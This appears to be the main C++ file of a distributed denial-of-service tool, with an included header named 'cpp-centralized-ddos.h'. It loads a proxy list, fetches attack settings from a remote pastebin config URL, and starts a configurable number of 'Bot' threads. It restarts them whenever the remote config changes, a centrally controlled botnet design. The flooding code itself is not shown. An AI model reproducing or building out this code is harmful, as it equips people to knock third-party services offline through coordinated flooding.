#include "cpp-centralized-ddos.h"

int threadCount;

void onConfigChanged() {

    Bot::stop();

    if (Config::localConfig.is_started) {

        this_thread::sleep_for(seconds(5));
        Bot::start(threadCount);
    }
}

int main() {

    ProxyList::Init();

    string configUrl;
    cout << "Enter config url [https://pastebin.com/raw/yHpxtU1U]: ";
    getline(cin, configUrl);

    if (configUrl.empty()) {
        configUrl = "https://pastebin.com/raw/yHpxtU1U";
    }

    string threadsCountRaw;
    cout << "Enter threads count [100]: ";
    getline(cin, threadsCountRaw);
    if (threadsCountRaw.empty()) {
        threadCount = 100;
    } else {
        threadCount = stoi(threadsCountRaw);
    }



    Config::Subscribe(onConfigChanged);
    Config::Init(configUrl);

    Config::Start();
    Bot::start(threadCount);

    cin.get();
    return 0;
}
